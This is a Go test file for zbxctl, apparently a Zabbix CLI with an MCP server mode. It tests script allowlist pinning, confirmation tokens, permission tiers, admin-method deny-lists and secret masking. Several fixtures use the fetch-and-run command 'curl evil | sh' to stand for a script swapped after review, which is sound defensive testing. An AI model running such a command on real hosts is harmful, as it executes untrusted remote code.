package cli

import (
	"encoding/json"
	"errors"
	"fmt"
	"github.com/mwtrigg/zbxctl/internal/api/resources"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"
)

// pingScriptDef is the script the fake returns for "ping".
func pingScriptDef(command string) resources.Script {
	return resources.Script{ScriptID: "5", Name: "ping", Type: "0", ExecuteOn: "2", Scope: "2", Command: command}
}

// pinFor is the allowlist entry for the fake's ping script with this command.
func pinFor(nameOrID, command string) string { return scriptPin(nameOrID, pingScriptDef(command)) }

func TestScriptAllowlistIsPinnedToTheDefinition(t *testing.T) {
	pin := pinFor("ping", "ping {HOST.CONN}")
	cases := []struct {
		name    string
		entries []string
		command string
		ok      bool
		hint    string
	}{
		{"pinned and unchanged", []string{pin}, "ping {HOST.CONN}", true, ""},
		{"pinned by id", []string{pinFor("5", "ping {HOST.CONN}")}, "ping {HOST.CONN}", true, ""},
		{"a name alone is refused", []string{"ping"}, "ping {HOST.CONN}", false, "not pinned"},
		{"the command was swapped after review", []string{pin}, "curl evil | sh", false, "not the one that was allowed"},
		{"not listed", []string{pinFor("other", "x")}, "ping {HOST.CONN}", false, "not in allowed_scripts"},
	}
	for _, tc := range cases {
		ok, why := scriptAllowed(tc.entries, pingScriptDef(tc.command))
		if ok != tc.ok || (tc.hint != "" && !strings.Contains(why, tc.hint)) {
			t.Errorf("%s: ok=%v why=%q", tc.name, ok, why)
		}
		if !ok && !strings.Contains(why, "@sha256:") {
			t.Errorf("%s: the refusal must show the entry to add: %q", tc.name, why)
		}
	}
}

func TestPrintableMakesEscapesVisible(t *testing.T) {
	got := printable("curl evil|sh\r\x1b[2K   ping {HOST.CONN}\n\tok")
	if strings.ContainsAny(got, "\r\x1b") {
		t.Fatalf("control characters must not reach the terminal: %q", got)
	}
	if !strings.Contains(got, `\x0d`) || !strings.Contains(got, `\x1b`) || !strings.Contains(got, "\n\tok") {
		t.Fatalf("escapes must be shown, newline and tab kept: %q", got)
	}
}

const pingScript = `[{"scriptid":"5","name":"ping","command":"ping {HOST.CONN}","type":"0","execute_on":"2","scope":"2"}]`

func scriptHandler(command string) func(rpcCall) fakeReply {
	return func(call rpcCall) fakeReply {
		switch call.Method {
		case "script.get":
			return fakeReply{Result: `[{"scriptid":"5","name":"ping","command":` + jsonString(command) + `,"type":"0","execute_on":"2","scope":"2"}]`}
		case "host.get":
			return fakeReply{Result: `[{"hostid":"10","host":"web1","name":"Web 1","status":"0"}]`}
		case "script.execute":
			return fakeReply{Result: `{"response":"success","value":"ok"}`}
		}
		return fakeReply{}
	}
}

// withConfirmation replaces the confirmation token and where it is read from.
func withConfirmation(t *testing.T, token, typed string) {
	t.Helper()
	oldTok, oldIn := confirmationToken, openConfirmationInput
	t.Cleanup(func() { confirmationToken, openConfirmationInput = oldTok, oldIn })
	confirmationToken = func() (string, error) { return token, nil }
	openConfirmationInput = func() (io.ReadCloser, error) { return io.NopCloser(strings.NewReader(typed + "\n")), nil }
}

func TestRunScriptNeedsOperatorTier(t *testing.T) {
	withConfirmation(t, "tok123", "tok123")
	f := &fakeZabbix{Handler: scriptHandler("ping {HOST.CONN}"),
		Context: "permissions: readonly\nallowed_scripts: ['" + pinFor("ping", "ping {HOST.CONN}") + "']"}
	_, err := runFake(t, f, "run", "script", "ping", "--host", "web1")
	if err == nil || len(f.called("script.execute")) != 0 {
		t.Fatalf("a readonly context must not run scripts: err=%v calls=%v", err, f.Calls)
	}
}

func TestRunScriptRunsOnlyThePinnedCommandAfterTheTokenIsTyped(t *testing.T) {
	ctxYAML := "permissions: operator\nallowed_scripts: ['" + pinFor("ping", "ping {HOST.CONN}") + "']"

	withConfirmation(t, "tok123", "tok123")
	f := &fakeZabbix{Handler: scriptHandler("ping {HOST.CONN}"), Context: ctxYAML}
	if _, err := runFake(t, f, "run", "script", "ping", "--host", "web1"); err != nil || len(f.called("script.execute")) != 1 {
		t.Fatalf("the pinned script with the right token must run: err=%v", err)
	}

	withConfirmation(t, "tok123", "wrong")
	f = &fakeZabbix{Handler: scriptHandler("ping {HOST.CONN}"), Context: ctxYAML}
	if _, err := runFake(t, f, "run", "script", "ping", "--host", "web1"); err == nil || len(f.called("script.execute")) != 0 {
		t.Fatalf("a wrong token must not run it: err=%v", err)
	}

	withConfirmation(t, "tok123", "tok123")
	f = &fakeZabbix{Handler: scriptHandler("curl evil | sh"), Context: ctxYAML}
	if _, err := runFake(t, f, "run", "script", "ping", "--host", "web1"); err == nil || len(f.called("script.execute")) != 0 {
		t.Fatalf("a script whose command changed must be refused: err=%v", err)
	}
}

func TestRunScriptRefusesWithoutATerminal(t *testing.T) {
	// the real opener: under `go test` stderr is not a terminal
	f := &fakeZabbix{Handler: scriptHandler("ping {HOST.CONN}"),
		Context: "permissions: operator\nallowed_scripts: ['" + pinFor("ping", "ping {HOST.CONN}") + "']"}
	_, err := runFake(t, f, "run", "script", "ping", "--host", "web1")
	if err == nil || len(f.called("script.execute")) != 0 {
		t.Fatalf("with no terminal there is nobody to confirm: err=%v", err)
	}
}

func TestAPICallRefusesAdminWritesAndMixedCase(t *testing.T) {
	for _, tc := range []struct {
		method  string
		allowed bool
	}{
		{"user.update", false}, {"token.Generate", false}, {"Script.execute", false}, {"script.create", false},
		{"action.create", false}, {"role.update", false}, {"usergroup.update", false}, {"mediatype.create", false},
		{"host.update", true}, {"hostgroup.create", true},
	} {
		f := &fakeZabbix{}
		_, err := runFake(t, f, "api", "call", tc.method, "--params", `{"x":1}`, "--apply", "--no-state")
		sent := len(f.called(tc.method)) > 0 || len(f.called(strings.ToLower(tc.method))) > 0
		if tc.allowed && (err != nil || !sent) {
			t.Errorf("%s should go through: err=%v", tc.method, err)
		}
		if !tc.allowed && (err == nil || sent) {
			t.Errorf("%s must be refused: err=%v sent=%v", tc.method, err, sent)
		}
	}
	f := &fakeZabbix{Context: "api_call_admin: true"}
	if _, err := runFake(t, f, "api", "call", "user.update", "--params", `{"userid":"2"}`, "--apply", "--no-state"); err != nil || len(f.called("user.update")) != 1 {
		t.Fatalf("api_call_admin must allow it: %v", err)
	}
}

func TestAPICallMasksSecretsInReads(t *testing.T) {
	f := &fakeZabbix{Handler: func(call rpcCall) fakeReply {
		return fakeReply{Result: `[{"hostid":"1","tls_psk":"abcd","snmp_community":"public123","password":"p","name":"web"}]`}
	}}
	out, err := runFake(t, f, "api", "call", "host.get")
	if err != nil || strings.Contains(out, "abcd") || strings.Contains(out, "public123") || !strings.Contains(out, `"name": "web"`) {
		t.Fatalf("secrets must be masked, other fields kept: %v\n%s", err, out)
	}
	out, _ = runFake(t, f, "api", "call", "host.get", "--show-secrets")
	if !strings.Contains(out, "abcd") {
		t.Fatalf("--show-secrets must show them: %s", out)
	}
}

func TestInterfacesHideTheSNMPCommunity(t *testing.T) {
	f := &fakeZabbix{Handler: func(call rpcCall) fakeReply {
		if call.Method == "host.get" {
			return fakeReply{Result: `[{"hostid":"10","host":"sw1","name":"sw1","interfaces":[{"interfaceid":"1","type":"2","main":"1","useip":"1","ip":"10.0.0.1","dns":"","port":"161","available":"1","details":{"version":"2","community":"s3cret"}}]}]`}
		}
		return fakeReply{}
	}}
	out, err := runFake(t, f, "get", "interfaces", "sw1")
	if err != nil || strings.Contains(out, "s3cret") {
		t.Fatalf("the community must not be printed: %v\n%s", err, out)
	}
	_ = errors.New
}

func TestMCPNeverOffersAPICallOrShowSecrets(t *testing.T) {
	for _, tool := range buildMCPTools(true) {
		if tool.Name == "zbxctl_api_call" {
			t.Fatal("api call is full API access and must not be an MCP tool")
		}
		if _, ok := tool.flags["show-secrets"]; ok {
			t.Fatalf("%s offers show-secrets", tool.Name)
		}
	}
}

func TestUpgradeAsksForYesWhenThereIsNoTerminal(t *testing.T) {
	rel := `{"tag_name":"v99.0.0","assets":[]}`
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { _, _ = w.Write([]byte(rel)) }))
	defer srv.Close()
	old := githubReleaseAPI
	githubReleaseAPI = srv.URL
	defer func() { githubReleaseAPI = old }()
	clearFlagState()
	defer clearFlagState()
	oldIn := os.Stdin
	devnull, _ := os.Open(os.DevNull)
	os.Stdin = devnull
	defer func() { os.Stdin = oldIn; devnull.Close() }()
	rootCmd.SetArgs([]string{"upgrade"})
	defer rootCmd.SetArgs(nil)
	err := rootCmd.Execute()
	var ce *cliErr
	if !errors.As(err, &ce) || ce.code != 5 {
		t.Fatalf("with no terminal and no --yes, upgrade must ask for --yes (exit 5), got %v", err)
	}
}

func hostsReply(n int) fakeReply {
	var hs []string
	for i := 0; i < n; i++ {
		hs = append(hs, fmt.Sprintf(`{"hostid":"%d","host":"h%d","name":"H%d","status":"0","interfaces":[]}`, 100+i, i, i))
	}
	return fakeReply{Result: "[" + strings.Join(hs, ",") + "]"}
}

func TestListsSayWhenTheyReachTheLimit(t *testing.T) {
	type meta struct {
		Meta map[string]any `json:"meta"`
	}
	run := func(n int, args ...string) (meta, []rpcCall) {
		f := &fakeZabbix{Handler: func(c rpcCall) fakeReply {
			if c.Method == "host.get" {
				return hostsReply(n)
			}
			return fakeReply{}
		}}
		out, err := runFake(t, f, append([]string{"get", "hosts"}, args...)...)
		if err != nil {
			t.Fatal(err)
		}
		var m meta
		if err := json.Unmarshal([]byte(out), &m); err != nil {
			t.Fatalf("%v\n%s", err, out)
		}
		return m, f.called("host.get")
	}
	if m, _ := run(2, "--limit", "2"); m.Meta["limit_reached"] != true || m.Meta["limit"] != float64(2) {
		t.Fatalf("a full page must say the limit was reached: %v", m.Meta)
	}
	if m, _ := run(1, "--limit", "2"); m.Meta["limit_reached"] != false {
		t.Fatalf("a short page is complete: %v", m.Meta)
	}
	m, calls := run(3, "--limit", "-1")
	if _, has := m.Meta["limit"]; has {
		t.Fatalf("--limit -1 means no limit: %v", m.Meta)
	}
	if _, sent := calls[0].Params["limit"]; sent {
		t.Fatalf("--limit -1 must not send a limit to Zabbix: %v", calls[0].Params)
	}
}

// A host named like an ID (a store or asset number) must not silently turn into
// the host that has that ID.
func TestNumericNamesAreNotAlwaysIDs(t *testing.T) {
	host := func(id, name string) string {
		return `{"hostid":"` + id + `","host":"` + name + `","name":"` + name + `","status":"0","hostgroups":[],"parentTemplates":[],"interfaces":[],"tags":[],"macros":[]}`
	}
	handler := func(withID, withName bool) func(rpcCall) fakeReply {
		return func(c rpcCall) fakeReply {
			if c.Method != "host.get" {
				return fakeReply{}
			}
			if ids, ok := c.Params["hostids"].([]any); ok && len(ids) == 1 {
				if withID {
					return fakeReply{Result: "[" + host("1001", "alpha") + "]"}
				}
				return fakeReply{Result: "[]"}
			}
			if withName {
				return fakeReply{Result: "[" + host("55", "1001") + "]"}
			}
			return fakeReply{Result: "[]"}
		}
	}
	get := func(h func(rpcCall) fakeReply, arg string) (string, error) {
		return runFake(t, &fakeZabbix{Handler: h}, "get", "host", arg)
	}
	out, err := get(handler(true, true), "1001")
	var ce *cliErr
	if !errors.As(err, &ce) || ce.code != 5 {
		t.Fatalf("both an ID and a name match: that must be refused as a usage error (exit 5), got err=%v\n%s", err, out)
	}
	if out, err := get(handler(true, true), "id:1001"); err != nil || !strings.Contains(out, "alpha") {
		t.Fatalf("id: picks the ID: %v\n%s", err, out)
	}
	if out, err := get(handler(true, true), "name:1001"); err != nil || !strings.Contains(out, `"host": "1001"`) {
		t.Fatalf("name: picks the name: %v\n%s", err, out)
	}
	if out, err := get(handler(false, true), "1001"); err != nil || !strings.Contains(out, `"hostid": "55"`) {
		t.Fatalf("a numeric name with no host of that ID resolves by name: %v\n%s", err, out)
	}
	if out, err := get(handler(true, false), "1001"); err != nil || !strings.Contains(out, "alpha") {
		t.Fatalf("an ID with no host of that name resolves by ID: %v\n%s", err, out)
	}
	// full-width digits are a name, never an ID
	f := &fakeZabbix{Handler: handler(false, false)}
	_, _ = runFake(t, f, "get", "host", "１００１")
	for _, c := range f.called("host.get") {
		if _, byID := c.Params["hostids"]; byID {
			t.Fatalf("non-ASCII digits must not be looked up as an ID: %v", c.Params)
		}
	}
}

func exitCode(t *testing.T, err error) int {
	t.Helper()
	var ce *cliErr
	if err == nil {
		return 0
	}
	if errors.As(err, &ce) {
		return ce.code
	}
	return classify(err)
}

func TestExitCodesTellTheTruth(t *testing.T) {
	// a tier refusal is its own kind, not a generic error
	f := &fakeZabbix{Handler: hostGetter, Context: "permissions: readonly"}
	if _, err := runFake(t, f, "delete", "host", "web1", "--apply"); exitCode(t, err) != 8 || len(f.called("host.delete")) != 0 {
		t.Fatalf("a readonly context refusing a write is exit 8: %v", err)
	}
	// something in front of Zabbix answering with HTML or a 404 is a connection problem
	for name, reply := range map[string]fakeReply{"404": {Status: 404}, "html with 200": {Result: "<html>"}} {
		f := &fakeZabbix{Handler: func(c rpcCall) fakeReply {
			if c.Method == "host.get" {
				return reply
			}
			return fakeReply{}
		}}
		if _, err := runFake(t, f, "get", "hosts", "--retries", "0"); exitCode(t, err) != 4 {
			t.Errorf("%s: want exit 4 (connection), got %v", name, err)
		}
	}
	// a failed lookup is not "not found"
	f = &fakeZabbix{Handler: func(c rpcCall) fakeReply {
		if c.Method == "hostgroup.get" {
			return fakeReply{Status: 502}
		}
		return fakeReply{}
	}}
	if _, err := runFake(t, f, "create", "host", "--name", "h", "--group", "Linux", "--dns", "h.example.com", "--retries", "0"); exitCode(t, err) != 4 {
		t.Errorf("a 502 while resolving a group is a connection error, not not_found: %v", err)
	}
	// bad flag combinations are usage errors
	if _, err := runFake(t, &fakeZabbix{}, "create", "host", "--name", "h", "--group", "1"); exitCode(t, err) != 5 {
		t.Errorf("missing --ip/--dns is a usage error: %v", err)
	}
}

func TestNoURLIsAUsageError(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	t.Setenv("ZBXCTL_URL", "")
	t.Setenv("ZBXCTL_CONTEXT", "")
	err := runChildArgs("get", "hosts")
	if exitCode(t, err) != 5 {
		t.Fatalf("an unconfigured URL is exit 5, got %v", err)
	}
}

// mode: apply (ZBXCTL_MODE) must work with every write path, including the
// single-object ones, and --dry-run must still preview.
func TestModeApplyAppliesSingleObjectWritesAndDryRunPreviews(t *testing.T) {
	handler := func(call rpcCall) fakeReply {
		switch call.Method {
		case "hostgroup.get":
			return fakeReply{Result: "[]"}
		case "hostgroup.create":
			return fakeReply{Result: `{"groupids":["50"]}`}
		}
		return fakeReply{}
	}
	t.Setenv("ZBXCTL_MODE", "apply")
	f := &fakeZabbix{Handler: handler}
	if _, err := runFake(t, f, "create", "group", "--name", "G1"); err != nil || len(f.called("hostgroup.create")) != 1 {
		t.Fatalf("mode apply must apply without --apply: %v", err)
	}
	if got := xdgStateFiles(t); len(got) != 1 {
		t.Fatalf("and still save a before-state: %v", got)
	}
	f = &fakeZabbix{Handler: handler}
	if _, err := runFake(t, f, "create", "group", "--name", "G2", "--dry-run"); err != nil || len(f.called("hostgroup.create")) != 0 {
		t.Fatalf("--dry-run must preview under mode apply: %v", err)
	}
}

func TestMCPChildAllowsTheDryRunTheServerPasses(t *testing.T) {
	t.Setenv("ZBXCTL_FROM_MCP", "1")
	t.Setenv("ZBXCTL_MODE", "dry-run")
	f := &fakeZabbix{Handler: func(c rpcCall) fakeReply {
		if c.Method == "hostgroup.get" {
			return fakeReply{Result: "[]"}
		}
		return fakeReply{}
	}}
	if _, err := runFake(t, f, "create", "group", "--name", "G", "--dry-run", "--output", "json"); err != nil || len(f.called("hostgroup.create")) != 0 {
		t.Fatalf("the child must accept --dry-run and write nothing: %v", err)
	}
	if err := runChildArgs("create", "group", "--name", "G", "--no-state"); err == nil || !strings.Contains(err.Error(), "over MCP") {
		t.Fatalf("--no-state must still be refused: %v", err)
	}
}

// Finding N4: where and how a script runs is part of what was reviewed.
func TestScriptPinCoversWhereItRunsAndItsParameters(t *testing.T) {
	base := pingScriptDef("ping {HOST.CONN}")
	pin := scriptPin("ping", base)
	for name, mutate := range map[string]func(s *resources.Script){
		"moved from the agent to the server": func(s *resources.Script) { s.ExecuteOn = "1" },
		"another scope":                      func(s *resources.Script) { s.Scope = "1" },
		"another user":                       func(s *resources.Script) { s.Username = "root" },
		"other parameters":                   func(s *resources.Script) { s.Parameters = []byte(`[{"name":"a","value":"b"}]`) },
		"another port":                       func(s *resources.Script) { s.Port = "2222" },
		"another type":                       func(s *resources.Script) { s.Type = "5" },
	} {
		changed := base
		mutate(&changed)
		if ok, _ := scriptAllowed([]string{pin}, changed); ok {
			t.Errorf("%s: the pin must no longer match", name)
		}
	}
}

func TestRunScriptRefusesCommandsThatExpandUserMacros(t *testing.T) {
	withConfirmation(t, "tok123", "tok123")
	cmd := "/usr/lib/zabbix/check.sh {$CHECK_ARGS}"
	f := &fakeZabbix{Handler: scriptHandler(cmd),
		Context: "permissions: operator\nallowed_scripts: ['" + pinFor("ping", cmd) + "']"}
	_, err := runFake(t, f, "run", "script", "ping", "--host", "web1")
	if exitOf(err) != 8 || len(f.called("script.execute")) != 0 {
		t.Fatalf("a macro-expanding script must be refused (exit 8): %v", err)
	}
}

func TestChildRefusesCommandsTheServerNeverOffers(t *testing.T) {
	t.Setenv("ZBXCTL_FROM_MCP", "1")
	for _, args := range [][]string{
		{"run", "script", "x", "--host", "h"}, {"api", "call", "host.get"}, {"upgrade"}, {"context", "use", "prod"},
		{"state", "prune", "--older-than", "1d"}, {"export", "template", "x"}, {"import", "template", "f.yaml"},
	} {
		if err := runChildArgs(args...); err == nil || !strings.Contains(err.Error(), "over MCP") {
			t.Errorf("%v must be refused over MCP, got %v", args, err)
		}
	}
	if err := runChildArgs("version"); err != nil && strings.Contains(err.Error(), "over MCP") {
		t.Errorf("version stays allowed: %v", err)
	}
}

// Finding N2 (security): the server resolves its context once; a later `context use`
// elsewhere must not move it.
func TestMCPPinsTheContextForEveryChild(t *testing.T) {
	old := mcpPinnedContext
	defer func() { mcpPinnedContext = old }()
	mcpPinnedContext = "lab"
	t.Setenv("ZBXCTL_CONTEXT", "prod") // what a stale parent environment might say
	var got []string
	for _, e := range mcpChildEnv() {
		if strings.HasPrefix(e, "ZBXCTL_CONTEXT=") {
			got = append(got, e)
		}
	}
	if len(got) == 0 || got[len(got)-1] != "ZBXCTL_CONTEXT=lab" {
		t.Fatalf("the pinned context must be the last (winning) value: %v", got)
	}
	if note := mcpContextNote(); !strings.Contains(note, "lab") {
		t.Fatalf("the server must say which context it is pinned to: %q", note)
	}
}

func TestMCPRefusesToStartWithoutAConnectionToPin(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	t.Setenv("ZBXCTL_CONTEXT", "")
	t.Setenv("ZBXCTL_URL", "")
	old := mcpPinnedContext
	defer func() { mcpPinnedContext = old }()
	if err := runChildArgs("mcp"); exitOf(err) != 5 {
		t.Fatalf("mcp with nothing to pin must refuse to start (exit 5): %v", err)
	}
}

func TestDefaultTierIsReadonly(t *testing.T) {
	f := &fakeZabbix{Handler: hostGetter, DefaultTier: true}
	if _, err := runFake(t, f, "delete", "host", "web1", "--apply"); exitOf(err) != 8 || len(f.called("host.delete")) != 0 {
		t.Fatalf("a connection with no tier must not write: %v", err)
	}
	f = &fakeZabbix{Handler: hostGetter, DefaultTier: true}
	if _, err := runFake(t, f, "get", "hosts"); err != nil {
		t.Fatalf("reads are still fine: %v", err)
	}
}

func TestAPICallRefusesMoreCodeRunningCreators(t *testing.T) {
	for _, m := range []string{"configuration.import", "connector.create", "item.create", "itemprototype.create", "settings.update", "mfa.update", "housekeeping.update", "proxy.update", "module.update", "discoveryrule.create"} {
		f := &fakeZabbix{}
		_, err := runFake(t, f, "api", "call", m, "--params", `{"x":1}`, "--apply", "--no-state")
		if err == nil || len(f.called(m)) != 0 {
			t.Errorf("%s must be refused without api_call_admin: %v", m, err)
		}
	}
	f := &fakeZabbix{}
	if _, err := runFake(t, f, "api", "call", "configuration.export", "--params", `{"options":{}}`); err != nil || len(f.called("configuration.export")) != 1 {
		t.Fatalf("export is a read and stays allowed: %v", err)
	}
}

func TestAuthCheckWarnsWhenTheTierIsStrongerThanTheRole(t *testing.T) {
	roleReply := func(roleType, name string) func(rpcCall) fakeReply {
		return func(c rpcCall) fakeReply {
			switch c.Method {
			case "user.checkAuthentication":
				return fakeReply{Result: `{"userid":"7","username":"agent"}`}
			case "user.get":
				return fakeReply{Result: `[{"userid":"7","username":"agent","role":{"roleid":"3","name":"` + name + `","type":"` + roleType + `"}}]`}
			}
			return fakeReply{}
		}
	}
	type row struct {
		Data []map[string]any `json:"data"`
	}
	run := func(f *fakeZabbix) map[string]any {
		out, err := runFake(t, f, "auth", "check")
		if err != nil {
			t.Fatal(err)
		}
		var r row
		if err := json.Unmarshal([]byte(out), &r); err != nil || len(r.Data) != 1 {
			t.Fatalf("%v\n%s", err, out)
		}
		return r.Data[0]
	}
	// a readonly context whose token belongs to a Super admin: warn
	d := run(&fakeZabbix{Handler: roleReply("3", "Super admin role"), Context: "permissions: readonly"})
	if d["ok"] != false || !strings.Contains(d["note"].(string), "enforced only by zbxctl") || d["can_change_configuration"] != true {
		t.Fatalf("must warn: %v", d)
	}
	// a readonly context whose token is a User role: fine
	d = run(&fakeZabbix{Handler: roleReply("1", "User role"), Context: "permissions: readonly"})
	if d["ok"] != true || d["note"] != "" {
		t.Fatalf("a user role under readonly is what we want: %v", d)
	}
	// a write context with a user role: ok, with a note that Zabbix will refuse most writes
	d = run(&fakeZabbix{Handler: roleReply("1", "User role"), Context: "permissions: write"})
	if d["ok"] != true || !strings.Contains(d["note"].(string), "cannot change the configuration") {
		t.Fatalf("%v", d)
	}
}
